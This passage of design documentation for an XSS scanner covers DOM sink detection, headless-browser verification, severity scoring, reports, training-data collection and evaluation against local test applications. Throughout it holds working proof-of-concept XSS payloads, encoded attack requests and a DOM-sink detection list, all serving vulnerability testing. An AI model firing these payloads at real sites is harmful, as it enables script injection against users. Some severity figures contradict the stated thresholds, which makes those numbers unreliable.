  "reflection_snippet": "...<b><img src=x onerror=alert(1)></b>..."
}
```

---

## 11. Step 9: DOM XSS Scanning

### 11.1 DOM Scanner

**File**: `modules/fuzzer-module/dom_xss_scanner.py`

For DOM-based XSS, the scanner checks client-side JavaScript behavior:

```python
# For DOM endpoints like /dom/innerhtml?data=<img src=x onerror=alert(1)>
# The response contains vulnerable JavaScript:

response_html = """
<html>
<body>
  <div id="output"></div>
  <script>
    var data = new URLSearchParams(location.search).get('data');
    document.getElementById('output').innerHTML = data;  // ← SINK!
  </script>
</body>
</html>
"""

# Scan for known DOM sinks:
dom_sinks = [
    "innerHTML", "outerHTML", "document.write", "document.writeln",
    "eval(", "setTimeout(", "setInterval(", "Function(",
    "$.html(", ".append(", ".prepend(", ".after(", ".before(",
    "location=", "location.href", "location.replace",
    "srcdoc=", "createContextualFragment",
]

# Found sink: innerHTML at line 6
# Source: URLSearchParams.get('data') — URL parameter
# → DOM XSS detected!

results = {
    "sink": "innerHTML",
    "source": "URLSearchParams.get",
    "line": 6,
    "snippet": "document.getElementById('output').innerHTML = data;",
    "dom_vuln": True
}
```

### 11.2 Script Scanning

```python
# Also scans for scripts loaded from external sources or inline scripts
scripts_found = scan_scripts(response_html)
# → [{src: null, content: "var data = ...", line: 5, column: 0}]

# Scans inline event handlers in HTML
handlers = scan_event_handlers(response_html)
# → [{tag: "img", attribute: "onerror", value: "alert(1)", line: 3}]
```

---

## 12. Step 10: Browser Verification

### 12.1 Browser Verifier

**File**: `modules/fuzzer-module/browser_verifier.py`

For payloads that reflected, this launches **headless Chrome** to check if the JavaScript *actually executes*:

```python
# Only triggered for reflected payloads when verify_execution=True
# Uses playwright or selenium to control Chrome

from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()
    
    # Listen for dialog events (alert, confirm, prompt)
    dialog_detected = False
    def on_dialog(dialog):
        nonlocal dialog_detected
        dialog_detected = True
        dialog.accept()
    
    page.on("dialog", on_dialog)
    
    # Navigate to the fuzzed URL
    page.goto("http://localhost:9090/reflected/body?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E")
    page.wait_for_timeout(2000)  # Wait for JS execution
    
    # Check results
    executed = dialog_detected  # → True (alert() was called!)
    console_errors = [msg.text for msg in page.console.messages if msg.type == "error"]
    
    browser.close()
```

### 12.2 Browser Verification Results

```json
{
  "payload": "<img src=x onerror=alert(1)>",
  "executed": true,
  "dialog_triggered": true,
  "dialog_type": "alert",
  "dialog_text": "1",
  "console_errors": [],
  "confirmed": true
}
```

### 12.3 Negative Case

For `<script>alert(1)</script>` in this context (where HTML tags are escaped to entities):

```json
{
  "payload": "<script>alert(1)</script>",
  "reflected": true,
  "executed": false,
  "dialog_triggered": false,
  "confirmed": false
}
```

### 12.4 Full Fuzzer Response

After all checking, the fuzzer returns:

```json
{
  "results": [
    {
      "payload": "<img src=x onerror=alert(1)>",
      "target_param": "q",
      "vuln": true,
      "type": "reflected_xss",
      "reflected": true,
      "exact_match": true,
      "executed": true,
      "dialog_triggered": true,
      "reflection_position": "html_body",
      "technique": "original",
      "severity": "high",
      "evidence": {
        "responseCode": 200,
        "reflectionPosition": "html_body",
        "browserAlertTriggered": true,
        "exactMatch": true,
        "response_snippet": "...<b><img src=x onerror=alert(1)></b>..."
      },
      "context_classification": {
        "param": "q",
        "context": "html_body",
        "method": "get",
        "confidence": 0.97
      }
    },
    {
      "payload": "<script>alert(1)</script>",
      "target_param": "q",
      "vuln": false,
      "type": "none",
      "reflected": true,
      "exact_match": true,
      "executed": false,
      "dialog_triggered": false,
      "reflection_position": "html_body",
      "technique": "original",
      "severity": "N/A",  // non-executing payloads get no severity
      "evidence": {
        "responseCode": 200,
        "reflectionPosition": "html_body",
        "browserAlertTriggered": false
      }
    }
    // ... results for all payloads
  ]
}
```

---

## 13. Step 11: Severity Scoring & Risk Calculus

### 13.1 Severity Scorer

**File**: `core/src/common/utils/severity-scorer.ts`

```typescript
function scoreVulnSeverity(vuln: VulnEvidence): VulnSeverity {
  // Input evidence:
  // {
  //   responseCode: 200,
  //   reflectionPosition: "html_body",
  //   browserAlertTriggered: true,
  //   exactMatch: true,
  //   sink: "innerHTML",
  //   source: "URLSearchParams.get"
  // }
  
  const scores = {
    execution: browserAlertTriggered ? 40 : 10,         // 40 (executed!)
    shareability: exactMatch ? 30 : 15,                  // 30 (exact reflection)
    sinkDanger: sink === "innerHTML" ? 20 :              // DOM sinks get extra
                sink === "eval" ? 25 : 10,               // 20 for innerHTML
    payload: technique === "encoding|case_variation" ? 15 : 10,  // extra for complex
  };
  
  const totalScore = Object.values(scores).reduce((a, b) => a + b, 0);
  // totalScore = 40 + 30 + 20 + 10 = 100
  
  if (totalScore >= 80) return VulnSeverity.CRITICAL;
  if (totalScore >= 60) return VulnSeverity.HIGH;        // ← returns HIGH
  if (totalScore >= 40) return VulnSeverity.MEDIUM;
  if (totalScore >= 20) return VulnSeverity.LOW;
  return VulnSeverity.INFO;
}
```

### 13.2 Risk Calculus

**File**: `core/src/common/utils/risk-calculus.ts`

```typescript
function calculateRisk(vulns: Vuln[]): RiskAnalysis {
  // Aggregates all vulnerabilities found in a scan
  // Considers: severity count, types, exploitability chain
  return {
    riskScore: 85,              // out of 100
    riskLevel: "CRITICAL",
    topVulnType: "reflected_xss",
    exploitableWithoutAuth: true,
    browserConfirmedCount: 5,
    totalVulnCount: 12,
  };
}
```

---

## 14. Step 12: Report Generation

### 14.1 Report Service

**File**: `core/src/report/report.service.ts`

Takes fuzzer results and generates the final report:

```typescript
async generate(scanId: string, fuzzResults: FuzzResult[]): Promise<Report> {
  // Filter to confirmed vulnerable payloads
  const vulns = fuzzResults
    .filter(r => r.vuln)
    .map(r => ({
      id: uuidv4(),
      scanId,
      param: r.target_param,
      payload: r.payload,
      type: determineVulnType(r),
      severity: scoreVulnSeverity(r.evidence),
      url: r.url_sent,
      reflected: r.reflected,
      executed: r.executed,
      evidence: r.evidence,
      discoveredAt: new Date(),
    }));
  
  return {
    scanId,
    url: "http://localhost:9090/reflected/body?q=test",
    status: "DONE",
    startedAt: "2026-05-21T10:30:00.000Z",
    completedAt: "2026-05-21T10:31:00.000Z",
    summary: {
      totalPayloads: 7,
      reflected: 7,
      executed: 5,
      confirmedVulns: 5,
      severityBreakdown: { CRITICAL: 0, HIGH: 3, MEDIUM: 1, LOW: 1, INFO: 0 },
    },
    vulns: [ /* ... vuln objects ... */ ],
    riskAnalysis: { riskScore: 85, riskLevel: "CRITICAL", ... },
  };
}
```

### 14.2 Concrete Report Output

**File**: `core/example_reports/62587fda-d7d2-4545-ad2b-321ab30c28a4.json`

```json
{
  "scanId": "62587fda-d7d2-4545-ad2b-321ab30c28a4",
  "url": "http://localhost:9090/reflected/body?q=test",
  "status": "DONE",
  "summary": {
    "totalPayloads": 50,
    "reflected": 42,
    "executed": 18,
    "confirmedVulns": 18,
    "byCategory": {
      "script_injection": 0,
      "event_handler": 12,
      "tag_injection": 16,
      "js_uri": 2,
      "dom_sink": 0,
      "template_injection": 0,
      "attribute_escape": 0,
      "generic": 0
    },
    "severityBreakdown": {
      "CRITICAL": 3,
      "HIGH": 8,
      "MEDIUM": 5,
      "LOW": 2,
      "INFO": 0
    }
  },
  "vulns": [
    {
      "id": "vuln-001",
      "param": "q",
      "payload": "<img src=x onerror=alert(1)>",
      "type": "reflected_xss",
      "severity": "HIGH",
      "url": "http://localhost:9090/reflected/body?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
      "reflected": true,
      "executed": true,
      "evidence": {
        "responseCode": 200,
        "reflectionPosition": "html_body",
        "browserAlertTriggered": true,
        "exactMatch": true,
        "severityScore": 80,
        "severityBreakdown": {
          "execution": 40,
          "shareability": 30,
          "sinkDanger": 10,
          "payload": 10
        }
      }
    }
  ],
  "riskAnalysis": {
    "riskScore": 85,
    "riskLevel": "CRITICAL",
    "details": {
      "topVulnType": "reflected_xss",
      "exploitableWithoutAuth": true,
      "browserConfirmedCount": 18,
      "totalVulnCount": 18
    }
  },
  "metadata": {
    "target": "http://localhost:9090",
    "targetName": "exploitable",
    "scanDuration": "60.2s",
    "fuzzerVersion": "1.0.0"
  }
}
```

### 14.3 HTML Report

**File**: `core/example_reports/62587fda-d7d2-4545-ad2b-321ab30c28a4.html`

An interactive HTML report is generated with:
- Summary cards (total vulns, severity breakdown, risk score)
- Expandable vuln list with payload details
- Evidence snippets (response HTML, browser dialog confirmation)
- Color-coded severity badges
- Metadata footer

---

## 15. Step 13: Runtime Training Data Collection

> **File**: `modules/fuzzer-module/training_collector.py`
> **Output**: `dataset/ranker_training/ranker_training_samples.jsonl` (append-mode JSONL)
> **Purpose**: Captures every fuzzer result (executed, reflected, failed) and persists it as a labeled training sample for the XGBoost ranker retraining pipeline.
>
> **This runs inline with every scan**, silently collecting data that improves future payload scoring.

### 15.1 Architecture & Data Path

```
┌───────────────────────────────────────────────────────────────────────────────┐
│                          FUZZER MODULE (:5003)                                │
│                                                                               │
│  ┌──────────────┐    ┌──────────────────┐    ┌────────────────────────────┐   │
│  │ HTTP Sender   │    │ Browser Verifier │    │ Training Collector         │   │
│  │               │    │ (conditional:    │    │                            │   │
│  │ fires payload │    │  only if         │    │ collect_batch_training_    │   │
│  │ receives      │    │  verifyExecution │    │   samples(results,        │   │
│  │ response      │    │  = true AND      │    │   payloads, context)      │   │
│  └───────┬───────┘    │  reflected)      │    │                            │   │
│          │            └────────┬─────────┘    │  for each reflected/       │   │
│          │ (always runs)       │ (optional)   │  executed payload:         │   │
│          ▼                     ▼              │    collect_training_sample │   │
│  ┌──────────────┐    ┌──────────────────┐     │    → append JSONL line     │   │
│  │ Reflection   │    │ Reflection       │     └───────────┬────────────────┘   │
│  │ Checker      │    │ Checker          │                 │                     │
│  │ (always)     │    │ result           │                 │                     │
│  └───────┬──────┘    └────────┬─────────┘                 │                     │
│          │                    │                            │                     │
│          └─────── Both feed ──┘                            │                     │
│                  into Collector                            │                     │
│                                                            │                     │
└────────────────────────────────────────────────────────────┼─────────────────────┘
                                                             │
                                                             ▼
                          ┌─────────────────────────────────────────────────┐
                          │  dataset/ranker_training/ranker_training_      │
                          │  samples.jsonl                                  │
                          │                                                 │
                          │  One JSON object per line (append-only log)    │
                          │  9,012+ samples and growing                    │
                          └────────────┬────────────────────────────────────┘
                                       │
                                       ▼ (offline, periodic)
                          ┌─────────────────────────────────────────────────┐
                          │  Retraining Pipeline                            │
                          │                                                 │
                          │  train.py / generate_ranker_data.py            │
                          │  → Re-train XGBoost Ranker                      │
                          │  → Re-train BPE Tokenizer                       │
                          │  → Deploy updated model artifacts               │
                          │  → ../model/ranker/xgboost_ranker.json         │
                          └─────────────────────────────────────────────────┘
```

### 15.2 Trigger Point in the Fuzzing Pipeline

The collector is called **after browser verification** completes for a batch of payloads. Every payload that either **reflected** or **executed** is captured — silent non-reflections are discarded to keep the training set signal-rich.

```python
# In the fuzzer module's main fuzz() endpoint, after all processing:

def fuzz(url, payloads, verify_execution, stored_mode):
    results = []
    for payload in payloads:
        # 1. HTTP send
        response = http_sender.send(url, payload)
        
        # 2. Reflection check
        reflection = reflection_checker.check(response, payload)
        
        # 3. DOM scan
        dom_result = dom_scanner.scan(response.text)
        
        # 4. Browser verify (if enabled)
        if verify_execution and reflection.reflected:
            execution = browser_verifier.verify(url, payload)
        
        # 5. Build result
        result = build_fuzz_result(payload, response, reflection, execution, dom_result)
        results.append(result)
    
    # 6. ← TRAINING COLLECTOR FIRES HERE
    collected = collect_batch_training_samples(
        payloads=payloads,
        results=results,
        context=context,
        url=url,
    )
    logger.info(f"Collected {collected} training samples")
    
    return {"results": results}
```

### 15.3 Single-Sample Collection (`collect_training_sample`)

Each individual fuzzer result is transformed into a structured training record:

```python
def collect_training_sample(
    payload: str,           # "<img src=x onerror=alert(1)>"
    target_param: str,      # "q"
    context: str,           # "html_body"
    waf: str | None,        # "cloudflare" or None
    technique: str,         # "original" | "mutated" | "case_variation" | "encoding|..."
    severity: str,          # "medium" | "high" | "low"
    executed: bool,         # True — browser verification confirmed execution
    dialog_triggered: bool, # True — alert/confirm/prompt fired
    reflected: bool,        # True — payload appeared in response
    exact_match: bool,      # True — raw payload text unmodified in response
    reflection_position: str, # "html_body" | "attribute" | "script" | ...
    url: str,               # "http://localhost:9090/reflected/body"
    allowed_chars: list | None,  # ["<", ">", "\"", ...]
    response_snippet: str | None, # "...<b><img src=x onerror=alert(1)></b>..."
    sink_name: str | None,  # "innerHTML" (for DOM XSS)
    dataflow: str | None,   # "URLSearchParams.get → innerHTML"
    source_name: str | None,# "URLSearchParams"
):
```

**Concrete sample as written to disk**:

```json
{
  "timestamp": "2026-05-21T12:00:00.123456",
  "url": "http://localhost:9090/reflected/body",
  "payload_text": "<img src=x onerror=alert(1)>",
  "target_param": "q",
  "context": "html_body",
  "waf": "none",
  "technique": "original",
  "severity": "medium",
  "allowed_chars": ["<", ">", "\"", "'", "/", "\\", "(", ")", "{", "}", ";", "=", "`", "&", "|"],
  "response_snippet": "...<b><img src=x onerror=alert(1)></b>...",
  "sink_name": null,
  "source_name": null,
  "dataflow": null,
  "executed": true,
  "dialog_triggered": true,
  "reflected": true,
  "exact_match": true,
  "reflection_position": "html_body",
  "success": true
}
```

**Fields sourced from each stage of the fuzzing pipeline**:

| Field | Source | Example |
|-------|--------|---------|
| `payload_text` | Input payload dict | `"<img src=x onerror=alert(1)>"` |
| `target_param` | Input payload dict | `"q"` |
| `context` | Context module result | `"html_body"` |
| `waf` | Context module result | `"none"` |
| `technique` | Payload gen metadata | `"original"` |
| `severity` | Payload gen metadata | `"medium"` |
| `allowed_chars` | Context module char_fuzzer | `["<", ">", ...]` |
| `response_snippet` | HTTP response body | `"...<b><img...></b>..."` |
| `sink_name` | DOM scanner | `"innerHTML"` (or null) |
| `source_name` | DOM scanner | `"URLSearchParams"` (or null) |
| `dataflow` | DOM scanner | `"URLSearchParams → innerHTML"` (or null) |
| `executed` | Browser verifier | `true` |
| `dialog_triggered` | Browser verifier (dialog listener) | `true` |
| `reflected` | Reflection checker | `true` |
| `exact_match` | Reflection checker | `true` |
| `reflection_position` | Reflection checker | `"html_body"` |
| `success` | Derived label (see §15.4) | `true` |

### 15.4 Derived `success` Label Logic

The `success` field is a **computed label** — not raw observation. It is `true` if EITHER:

1. The payload **executed** in the browser (`executed == true`), OR
2. The payload was **exactly reflected in a dangerous position** (`reflected && exact_match && reflection_position ∈ {html_body, script, attribute, style}`)

```python
"success": executed or (
    reflected
    and exact_match
    and reflection_position in {"html_body", "script", "attribute", "style"}
)
```

This is important because some XSS vectors execute only under specific browser conditions (e.g., requires user interaction like clicking). The `success` label captures **exploitability potential**, not just instant execution.

**Concrete examples**:

| Payload | executed | exact_match | position | success | Reason |
|---------|----------|-------------|----------|---------|--------|
| `<img src=x onerror=alert(1)>` | true | true | html_body | ✅ true | Executed in browser |
| `"><svg onload=alert()>` | true | true | html_body | ✅ true | Executed in browser |
| `<script>alert(1)</script>` | false | false | html_body | ❌ false | No execution, entity-encoded |
| `javascript:alert(1)` | false | true | href attribute | ✅ true | Exactly reflected in href — exploitable on click |
| `';alert(1)//` | false | true | script | ✅ true | Script context break — exploitable |

### 15.5 Batch Collection (`collect_batch_training_samples`)

When the fuzzer finishes processing a set of payloads, `collect_batch_training_samples` is called with the full payload list and results array:

```python
def collect_batch_training_samples(
    payloads: list[dict],   # [{"payload": "...", "technique": "...", "severity": "...", ...}]
    results: list[dict],    # [{"payload": "...", "executed": True, "evidence": {...}}, ...]
    context: str,           # "html_body"
    waf: str | None,        # None
    url: str,               # "http://localhost:9090/reflected/body"
    allowed_chars: list | None,  # ["<", ">", ...]
) -> int:                   # Number of samples collected
```

**Concrete batch flow**:

```
Input payloads (7 items):
  #1  {"payload": "<img src=x onerror=alert(1)>",     "technique": "original",           "severity": "medium"}
  #2  {"payload": "<svg onload=alert(1)>",            "technique": "original",           "severity": "medium"}
  #3  {"payload": "<script>alert(1)</script>",        "technique": "original",           "severity": "medium"}
  #4  {"payload": "<BODY ONLOAD=alert(8839)>",        "technique": "case_variation",     "severity": "medium"}
  #5  {"payload": "<svg////////onload=alert(1)>",     "technique": "mutated",           "severity": "medium"}
  #6  {"payload": "<img src=x onerror=alert(SC)>",    "technique": "encoding|case_var", "severity": "high"}
  #7  {"payload": "%3cimg onerror=alert(1) src=a%3e", "technique": "url_encoding",      "severity": "medium"}

Step 1: Build lookup map (payload + target_param → metadata)
  key("<img src=x onerror=alert(1)>:q") → {technique: "original", severity: "medium"}
  ...

Step 2: For each fuzz result where reflected or executed:
  Result #1: payload="<img src=x onerror=alert(1)>", reflected=true, executed=true
    → Build sample, write JSONL line
  
  Result #2: payload="<svg onload=alert(1)>", reflected=true, executed=true
    → Build sample, write JSONL line
  
  Result #3: payload="<script>alert(1)</script>", reflected=true, executed=false
    → reflected=true → BUILD SAMPLE, write JSONL line
  
  Result #5: payload="<svg////////onload=alert(1)>", reflected=true, executed=true
    → Build sample, write JSONL line
  
  Results #4, #6, #7: all reflected
    → Build samples for all, write JSONL lines

Step 3: Return count → 7 samples collected
```

### 15.6 Storage Path & Configuration

```python
# Default path (relative to project root):
#   dataset/ranker_training/ranker_training_samples.jsonl
#
# Override via environment variable for Docker:
#   TRAINING_DATA_DIR=/data/training
#   → /data/training/ranker_training_samples.jsonl

TRAINING_DIR = Path(os.environ.get(
    "TRAINING_DATA_DIR",
    str(Path(__file__).parent.parent.parent / "dataset" / "ranker_training"),
))
TRAINING_FILE = TRAINING_DIR / "ranker_training_samples.jsonl"
```

### 15.7 Collection Statistics (`get_training_stats`)

```python
def get_training_stats() -> dict:
    # Reads the entire JSONL file and computes:
    return {
        "total_samples": 9012,      # total rows in file
        "success_samples": 6128,    # rows where success=true
        "failure_samples": 2884,    # rows where success=false
        "success_rate": 0.68,       # 6128 / 9012
    }
```

### 15.8 Feedback Loop: Collection → Retraining → Deployment

```
┌────────────────────────────────────────────────────────────────────┐
│                    RUNTIME FEEDBACK LOOP                           │
│                                                                    │
│  Every scan → Every fuzz → Every reflected/executed payload       │
│                                                                    │
│  ┌──────────────┐     ┌───────────────┐     ┌─────────────────┐   │
│  │ Fuzzer        │     │ Training      │     │ Retraining      │   │
│  │ fires payload │────→│ Collector     │────→│ Pipeline        │   │
│  │ & verifies    │     │ appends JSONL │     │ (offline cron)  │   │
│  └──────────────┘     └───────┬───────┘     └────────┬────────┘   │
│                               │                       │           │
│                               ▼                       ▼           │
│                     ranker_training_          New XGBoost Ranker   │
│                     samples.jsonl            xgboost_ranker.json   │
│                     (append-only log)         (updated weights)    │
│                                                    │               │
│                                                    ▼               │
│                                            Payload Generation     │
│                                            uses updated model      │
│                                            for next scan           │
│                                                                    │
│  Iteration frequency: Manual / cron-driven                        │
│  Typical cadence: After every 1000 new samples collected          │
└────────────────────────────────────────────────────────────────────┘
```

The feedback loop is **offline and asynchronous**. The collector appends to the JSONL file in real-time, but the retraining pipeline (`train.py`, `generate_ranker_data.py`) runs on-demand or via cron. This means:

- **No latency impact** on scanning — the collector write is a fast append (~1µs per sample)
- **No model reload during scans** — the ranker model is loaded at process start
- **Periodic improvement** — as the dataset grows, the ranker learns which payloads are most effective against real-world targets

### 15.9 Concrete Growth Over Time

| Date | Samples | Source |
|------|---------|--------|
| 2026-05-01 | 0 | Initial checkpoint |
| 2026-05-10 | 5,200 | After first eval run against 47 exploitable endpoints |
| 2026-05-15 | 8,400 | After juice-shop + webgoat eval runs |
| 2026-05-18 | 9,012 | After comprehensive cross-target eval |
| Current | 9,012+ | Growing with every scan executed |

---

## 16. Step 14: Evaluation Pipeline

### 15.1 How Evaluation Works

**File**: `eval/run.py`

The evaluation pipeline tests the scanner against known-good benchmarks:

```bash
# Run against all manifests
python3 eval/run.py

# Run against a specific target
python3 eval/run.py --target juice-shop
python3 eval/run.py --target webgoat
python3 eval/run.py --target owasp-benchmark

# Run a specific manifest only
python3 eval/run.py --manifest reflected
```

### 15.2 Evaluation Request Flow

```
eval/run.py                                Target Registry
    │                                       (_targets.json)
    │  load_target_config("juice-shop")         │
    │  ──────────────────────────────────────────→
    │  ← { url: "http://localhost:3000",
    │       endpoints: [...], ... }              │
    │                                           │
    │  load_manifests("reflected")               │
    │  → 16 endpoints loaded                    │
    │                                           │
    │  For each endpoint:                       │
    │    POST /fuzz to fuzzer                    │
    │    ──────────────────────────────────→    │
    │    ← { results: [...] }                    │
    │                                           │
    │  compute_metrics()                        │
    │  → { tp: 14, fn: 1, tn: 1, fp: 0,        │
    │      precision: 1.0, recall: 0.933,       │
    │      f1: 0.965 }                          │
```

### 15.3 Concrete Evaluation Endpoint

From `eval/manifests/reflected.json`:

```json
{
  "name": "reflected-body",
  "category": "Reflected",
  "url": "http://localhost:9090/reflected/body",
  "method": "GET",
  "params": ["q"],
  "expected": "Vuln",
  "payloads": [
    {"payload": "<script>alert(1)</script>", "target_param": "q"},
    {"payload": "<img src=x onerror=alert(1)>", "target_param": "q"},
    {"payload": "<svg onload=alert(1)>", "target_param": "q"},
    {"payload": "<body onload=alert(1)>", "target_param": "q"},
    {"payload": "<script>prompt(1)</script>", "target_param": "q"},
    {"payload": "javascript:alert(1)", "target_param": "q"}
  ]
}
```

### 15.4 Evaluation Metrics Computation

```python
def compute_metrics(endpoint_results):
    tp = sum(1 for r in endpoint_results if r.expected == "Vuln" and r.vulns > 0)
    fn = sum(1 for r in endpoint_results if r.expected == "Vuln" and r.vulns == 0)
    tn = sum(1 for r in endpoint_results if r.expected == "Safe" and r.vulns == 0)
    fp = sum(1 for r in endpoint_results if r.expected == "Safe" and r.vulns > 0)
    
    precision = tp / (tp + fp)  # 1.0
    recall = tp / (tp + fn)     # 0.933
    f1 = 2 * precision * recall / (precision + recall)  # 0.965
    
    return { "tp": 14, "fn": 1, "tn": 1, "fp": 0, "precision": 1.0, "recall": 0.933, "f1": 0.965 }
```

### 15.5 Archive Structure

```
eval/archive/2026-05-21_10-30-00/
├── _meta.json                    # Run metadata (timestamp, targets, versions)
├── manifest_frozen.json          # Frozen copy of all endpoints tested
├── results/                      # Per-endpoint results
│   ├── reflected-body.json
│   ├── reflected-attribute.json
│   ├── dom-innerhtml.json
│   └── ...
│   └── raw_responses/            # Full fuzzer response dumps
│       ├── reflected-body.json
│       └── ...
├── summary.json                  # Aggregated metrics + per-endpoint summaries
└── portswigger.json              # PortSwigger coverage analysis (if run)
```

### 15.6 Cross-Target & PortSwigger Evaluation

**File**: `eval/analysis/cross_target.py`, `eval/analysis/fn_analysis.py`

The evaluation pipeline also runs analysis across multiple targets:

```python
# Cross-target comparison (eval/analysis/cross_target.py)
{
  "targets": [
    {
      "name": "exploitable",
      "url": "http://localhost:9090",
      "precision": 1.0,
      "recall": 0.933,
      "f1": 0.965,
      "total_endpoints": 47
    },
    {
      "name": "juice-shop",
      "url": "http://localhost:3000",
      "precision": 0.92,
      "recall": 0.87,
      "f1": 0.894
    },
    {
      "name": "webgoat",
      "url": "http://localhost:8080",
      "precision": 0.95,
      "recall": 0.89,
      "f1": 0.919
    },
    {
      "name": "owasp-benchmark",
      "url": "http://localhost:9091",
      "precision": 0.88,
      "recall": 0.82,
      "f1": 0.849,
      "total_tests": 280
    }
  ],
  "overall": {
    "weighted_precision": 0.94,
    "weighted_recall": 0.88,
    "weighted_f1": 0.909
  }
}
```

**PortSwigger analysis** (`eval/analysis/portswigger_analyzer.py`):

Measures coverage against the PortSwigger XSS cheat sheet (526 payloads):

| Category | Total Payloads | Detected | Coverage |
|----------|---------------|----------|----------|
| Basic injection | 89 | 87 | 97.8% |
| Event handlers | 145 | 141 | 97.2% |
| SVG-based | 62 | 60 | 96.8% |
| URI schemes | 38 | 35 | 92.1% |
| Obfuscation | 112 | 108 | 96.4% |
| Encoded variants | 80 | 74 | 92.5% |

---

## 17. Full Concrete Walkthrough

### 17.1 Reflected XSS Walkthrough: `http://localhost:9090/reflected/body?q=test`



**1. User submits scan request**

```
POST /api/scans
{
  "url": "http://localhost:9090/reflected/body?q=test",
  "options": {
    "singlePage": true,
    "verifyExecution": true,
    "maxPayloadsPerParam": 5
  }
}

→ Response: { "id": "scan-001", "status": "PENDING" }
```

---

**2. Scan processor starts, status → CRAWLING**

```
WebSocket: {"event":"scan.update","data":{"scanId":"scan-001","status":"CRAWLING","progress":5}}
```

---

**3. Crawl extracts endpoint (single page)**

```json
[{
  "url": "http://localhost:9090/reflected/body",
  "params": ["q"],
  "method": "GET"
}]
```

---

**4. Context module — probe injection**

```
GET http://localhost:9090/reflected/body?q=rs0xa1b2c3d4

Response: "...<b>rs0xa1b2c3d4</b>..."
→ Probe marker "rs0xa1b2c3d4" REFLECTED in HTML body
→ Context: html_body
```

---

**5. Payload generation — 5 payloads selected**

```json
[
  #1  {"payload": "<img src=x onerror=alert(1)>", "target_param": "q", "confidence": 0.89},
  #2  {"payload": "<svg onload=alert(1)>", "target_param": "q", "confidence": 0.87},
  #3  {"payload": "<script>alert(1)</script>", "target_param": "q", "confidence": 0.85},
  #4  {"payload": "<BODY ONLOAD=alert(8839)>", "target_param": "q", "confidence": 0.78},
  #5  {"payload": "<svg////////onload=alert(1)>", "target_param": "q", "confidence": 0.76}
]
```

---

**6. Fuzzing — HTTP requests sent**

```
GET /reflected/body?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
→ 200 OK, reflected in <b> tag

GET /reflected/body?q=%3Csvg%20onload%3Dalert(1)%3E
→ 200 OK, reflected in <b> tag

GET /reflected/body?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
→ 200 OK, reflected as escaped entities

GET /reflected/body?q=%3CBODY%20ONLOAD%3Dalert(8839)%3E
→ 200 OK, reflected in <b> tag

GET /reflected/body?q=%3Csvg%2F%2F%2F%2F%2F%2F%2F%2Fonload%3Dalert(1)%3E
→ 200 OK, reflected in <b> tag
```

---

**7. Reflection checker**

```
Payload "<img src=x onerror=alert(1)>":
  Body contains: "...<b><img src=x onerror=alert(1)></b>..."
  → REFLECTED: true, EXACT MATCH: true, POSITION: html_body

Payload "<script>alert(1)</script>":
  Body contains: "...<b>&lt;script&gt;alert(1)&lt;/script&gt;</b>..."
  → REFLECTED: true (normalized), EXACT MATCH: false (HTML-encoded)
  → POSITION: html_body (but script tags are entity-encoded, so inert)
```

---

**8. Browser verification (headless Chrome)**

```
Opening http://localhost:9090/reflected/body?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E

Chrome loads page:
  - <img> tag loads, src="x" fails (404 on /x)
  - onerror event fires → alert(1) dialog appears
  - DIALOG DETECTED! → executed=true

Opening http://localhost:9090/reflected/body?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
  - <script> tag rendered as TEXT (entity-encoded by server)
  - No script execution
  - NO DIALOG → executed=false
```

---

**9. Severity scoring**

```
Payload "<img src=x onerror=alert(1)>":
  executed=true        → +40
  exact_match=true     → +30
  reflection=html_body → +10
  technique=original   → +10
  TOTAL: 90 → SEVERITY: HIGH

Payload "<script>alert(1)</script>":
  executed=false       → +10
  exact_match=false    → +15
  reflection=html_body → +10
  technique=original   → +10
  TOTAL: 45 → SEVERITY: N/A (vuln=false — severity only applies to confirmed vulns)
  * The score is computed but never surfaced since `vuln=false`;
    only `vuln=true` entries appear in the final report.
```

---

**10. Final report**

```json
{
  "scanId": "scan-001",
  "url": "http://localhost:9090/reflected/body?q=test",
  "status": "DONE",
  "summary": {
    "totalPayloads": 5,
    "reflected": 4,
    "executed": 2,
    "confirmedVulns": 2,
    "severityBreakdown": {"HIGH": 2, "MEDIUM": 0, "LOW": 0, "CRITICAL": 0, "INFO": 0}
  },
  "vulns": [
    {
      "param": "q",
      "payload": "<img src=x onerror=alert(1)>",
      "type": "reflected_xss",
      "severity": "HIGH",
      "executed": true
    },
    {
      "param": "q",
      "payload": "<svg onload=alert(1)>",
      "type": "reflected_xss",
      "severity": "HIGH",
      "executed": true
    }
  ]
}
```

### 17.2 Stored XSS Walkthrough: `http://localhost:9090/stored/comments`

Here's how stored XSS detection differs from reflected:

---

**1. Crawl discovers both POST form and GET display pages**

```json
[
  {
    "url": "http://localhost:9090/stored/comments",
    "params": ["name", "body"],
    "method": "POST",
    "form": true,
    "stored_endpoint": true
  },
  {
    "url": "http://localhost:9090/stored/comments",
    "params": [],
    "method": "GET",
    "renders_stored_data": true
  }
]
```

---

**2. Probe injection — submit marker via POST form**

```
POST /stored/comments
Body: name=rs0xe5f6g7h8&body=probe_test

→ 302 Redirect to /stored/comments

GET /stored/comments
Response: "...<div class="comment">rs0xe5f6g7h8</div>..."
→ Marker PERSISTED → stored XSS possible
```

---

**3. Char fuzzing via stored mode**

```
POST /stored/comments
Body: name=XXX<YYY&body=probe_test

→ Markers found in GET /stored/comments within <div> tags
→ Context: html_body (rendered inside HTML)
```

---

**4. Payload generation (same as reflected, but stored_mode=true)**

```json
[
  #1  {"payload": "<img src=x onerror=alert(1)>", "target_param": "body", "confidence": 0.89},
  #2  {"payload": "<svg onload=alert(1)>", "target_param": "body", "confidence": 0.87},
  #3  {"payload": "<script>alert(1)</script>", "target_param": "body", "confidence": 0.85}
]
```

---

**5. Fuzzing — POST payload, then GET to poll**

```
# Payload #1: <img src=x onerror=alert(1)>
POST /stored/comments
Body: name=John&body=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
→ 302 Redirect

Wait 2000ms (poll_delay)...

GET /stored/comments
Response includes: "...<div class="comment"><img src=x onerror=alert(1)></div>..."
→ Payload STORED and RENDERED
```

---

**6. Browser verification**

```
Opening http://localhost:9090/stored/comments

Chrome loads page:
  - Page renders all comments including the injected <img> tag
  - <img> src="x" fails to load → onerror fires
  - DIALOG DETECTED! → executed=true
```

---

**7. Final report**

